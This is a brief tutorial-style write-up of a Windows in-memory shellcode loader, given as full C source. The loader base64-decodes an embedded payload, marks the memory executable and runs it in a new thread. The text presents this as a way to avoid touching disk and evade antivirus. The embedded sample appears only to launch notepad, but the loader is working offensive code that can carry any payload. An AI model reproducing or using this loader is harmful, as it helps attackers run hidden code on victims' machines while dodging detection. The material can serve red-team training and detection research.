# Base64 Encoded Payload

The C code demonstrates the implementation of executing a base64-encoded payload in memory, typical of a simple shellcode execution technique often used in penetration testing or malware.

Key Components:

1. **Base64 Decoding**: The `DecodeBase64` function uses Windows API `CryptStringToBinaryA` to decode the base64-encoded payload into binary data.
2. **Memory Allocation**: `VirtualAlloc` reserves memory pages with read-write permissions to hold the decoded payload.
3. **Memory Protection**: `VirtualProtect` changes the protection of the allocated memory to allow execution (`PAGE_EXECUTE_READ`).
4. **Thread Execution**: The `CreateThread` function starts a new thread with the entry point as the decoded shellcode, effectively running the shellcode.
5. **Memory Cleanup**: After execution, `VirtualFree` releases the allocated memory to prevent resource leaks.

This technique is commonly known in security as an in-memory code execution, which allows payloads to execute without the need to touch disk, reducing detection by conventional antivirus solutions.

```c
#include <Windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

// certutul -encode notepad.bin encoded_payload
unsigned char payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/Vbm90ZXBhZC5leGUA";
unsigned int payload_len = sizeof(payload);

int DecodeBase64(const BYTE* src, unsigned int srcLen, char * dst, unsigned int dstLen) {
    DWORD outLen;
    BOOL fRet;

	fRet = CryptStringToBinaryA((LPCSTR)src, srcLen, CRYPT_STRING_BASE64, (BYTE *) dst, &outLen, NULL, NULL);
    if (!fRet) outLen = 0;

    return(outLen);
}

int main(void) {
    void* exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) {
        printf("VirtualAlloc failed: %lu\n", GetLastError());
        return 1;
    }

    DecodeBase64((const BYTE *) payload, payload_len, (char *)exec_mem, payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if (!rv) {
        printf("VirtualProtect failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (!th) {
        printf("CreateThread failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }

    WaitForSingleObject(th, INFINITE);

    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}
```
